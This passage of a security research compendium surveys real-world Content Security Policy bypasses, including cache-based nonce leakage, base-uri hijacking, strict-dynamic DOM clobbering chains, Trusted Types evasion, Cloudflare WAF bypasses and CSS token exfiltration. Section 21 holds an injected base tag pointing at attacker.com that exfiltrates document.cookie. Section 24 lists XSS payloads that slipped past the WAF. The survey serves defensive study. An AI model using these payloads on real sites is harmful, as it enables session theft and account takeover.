### 20. Nonce Leakage via Browser Caching (bfcache/Disk Cache) -- Real-World Cases

**Technique:** Combined HTML injection + browser caching to recover valid CSP nonces from cached page responses.

**Real-world conditions enabling this bypass:**
- Sites using CDN-level caching (CloudFront, Cloudflare, Fastly) that cache HTML responses including CSP nonce headers
- Reverse proxy configurations (nginx, Varnish) that cache full HTTP responses
- Server-side template caching that preserves nonce values across requests
- bfcache (back/forward cache) in all major browsers preserving the full page state including nonces

**Attack scenario:**
1. Attacker achieves CSS injection on a nonce-protected page
2. CSS attribute selectors exfiltrate the nonce from a `<meta>` tag or DOM attribute
3. Browser caches the page (via bfcache on navigation, or via disk cache through CDN)
4. Attacker navigates user back to the cached page (history.back() or bfcache restore)
5. Cached page still carries the original nonce value
6. Attacker injects a script with the known nonce

**Affected real-world configurations:**
- Sites with `Cache-Control: max-age=300` or similar on HTML pages with nonces
- Sites using `Vary: Cookie` but not `Cache-Control: no-store` on authenticated pages
- SPA/SSR hybrid sites where the initial HTML is cached by CDN

**Source:** https://www.webasha.com/blog/what-is-the-new-technique-that-bypasses-content-security-policy-using-html-injection-and-browser-caching
**Source:** https://jorianwoltjer.com/blog/p/research/nonce-csp-bypass-using-disk-cache

### 21. base-uri Hijacking in Modern SPA Frameworks

**Observed pattern in 2024-2026 bug bounty reports:** Many modern SPA frameworks (Next.js, Nuxt, SvelteKit) deploy nonce-based CSP with strict-dynamic but omit `base-uri`, creating a systematic base-uri hijacking vulnerability.

**Why this is common:**
- Framework CSP documentation often focuses on `script-src` and `default-src`
- `base-uri` does not fall back to `default-src`, so it is unrestricted by default
- CSP generators and middleware packages frequently omit `base-uri`
- Developers testing CSP with browser DevTools see no warnings about missing `base-uri`

**Real-world exploitation pattern:**
```html
<!-- Target page CSP: script-src 'nonce-abc123' 'strict-dynamic'; default-src 'self' -->
<!-- Note: no base-uri directive -->

<!-- Step 1: HTML injection point -->
<base href="https://attacker.com/">

<!-- Step 2: Page's existing script loads from attacker.com -->
<script nonce="abc123" src="/js/main.js"></script>
<!-- Browser loads https://attacker.com/js/main.js with valid nonce -->

<!-- Step 3: Attacker's main.js creates additional scripts -->
<!-- strict-dynamic trusts all dynamically created scripts -->
document.createElement('script').textContent = 'exfil(document.cookie)';
```

### 22. strict-dynamic Gadgets in Production (2024)

**Brett Buerhaus -- "Go Go XSS Gadgets" (February 2024)**

A real-world exploitation of strict-dynamic CSP bypass via DOM clobbering on a production application. This is the most complete documented case of a strict-dynamic bypass chain in a real target.

**Full chain details:**
1. postMessage origin validation bypassed via XSS on a trusted sibling domain
2. Double-anchor DOM clobbering technique: `<a id="mGlobals"></a><a id="mGlobals" name="nuanceLaunchJS" href="attacker.com">`
3. Trusted nonced script read the clobbered `mGlobals.nuanceLaunchJS` value
4. Dynamic script creation loaded attacker's payload; strict-dynamic propagated trust
5. Full XSS with cookie theft and account takeover

**Rollup DOM Clobbering in the Wild (CVE-2024-47068):**

Rollup's generated module system code used DOM-clobberable references (`document.currentScript`) for chunk loading base URL. Any application using Rollup-bundled JavaScript with an HTML injection point was vulnerable.

**Webpack DOM Clobbering (GHSA-4vvj-4cpr-p986):**

Webpack's AutoPublicPathRuntimeModule similarly used `document.currentScript` for base URL. Both build tools have since patched their generated code.

**Source:** https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/
**Source:** https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm
**Source:** https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986

### 23. MutantBedrog Malvertising Campaign -- Trusted Types CSP Bypass

**Campaign:** MutantBedrog (observed 2024-2025)
**Significance:** First documented large-scale malvertising campaign specifically targeting Trusted Types CSP protections.

The campaign worked around Trusted Types at every stage of execution, appearing to navigate the restrictions rather than break them through a single vulnerability. The attackers used a combination of:
- Default policy abuse (overly permissive default Trusted Types policies)
- Script gadgets in trusted advertising libraries
- Attribute node manipulation bypasses

**Lesson:** Trusted Types deployment must include strict default policy configuration. A permissive default policy (`createHTML: s => s`) effectively disables the protection.

**Source:** https://blog.confiant.com/p/the-curious-case-of-mutantbedrogs

### 24. Cloudflare WAF Bypass Cases (2025-2026)

**Mixed-Case Event Handler Bypass:**
Multiple researchers independently discovered that Cloudflare's WAF performed case-sensitive matching on event handler names while browsers parse HTML case-insensitively.

Payload: `<img src=x oNeRrOr=alert(1)>`
Result: WAF passed the request; browser executed the handler.

**Null Byte Injection:**
Malformed attributes containing null bytes caused Cloudflare's WAF to terminate parsing early, missing the payload.

**SVG Injection:**
SVG elements were not inspected as thoroughly as standard HTML elements, allowing `<svg/onload=alert(1)>` and `<svg><script>alert(1)</script></svg>` to bypass WAF rules.

**Cloudflare Response (2026):**
Cloudflare added new managed rules including "XSS - JavaScript Event Handler Coercion - URI" and WordPress-specific "XSS2Shell" (CVE-2026-64638).

**Source:** https://medium.com/@pranavrp77/xss-bypassing-cloudflare-waf-with-a-simple-trick-12aff8ce87c7
**Source:** https://developers.cloudflare.com/changelog/product/waf/

### 25. CSS-Only Exfiltration: OAuth Token Theft Under Strict CSP

**Researcher:** Voorivex Team
**Year:** 2024

A strict CSP prevented all JavaScript execution, but `style-src 'unsafe-inline'` was set. The researcher used CSS attribute selectors to exfiltrate an OAuth access token character by character using iterative `background-image` requests.

This case demonstrates that `style-src 'unsafe-inline'` should be treated as a data leakage risk, not just a cosmetic concern. Complete OAuth access tokens were stolen without any JavaScript execution.

**Source:** https://blog.voorivex.team/css-data-exfiltration-to-steal-oauth-token

### 26. Chrome CVE-2026-13790: Scroll-Based Side-Channel Leak

**CVE:** CVE-2026-13790
**Affected:** Chrome prior to version 150.0.7871.47
**CWE:** CWE-1300 (Improper Protection of Physical Side Channels)

A side-channel leak in Chrome's scroll handling allowed a remote attacker to leak cross-origin data via a crafted HTML page. This demonstrates that browser rendering mechanics (scroll position, container dimensions) create side channels usable for data exfiltration even without direct script access.

**Source:** https://app.opencve.io/cve/CVE-2026-13790
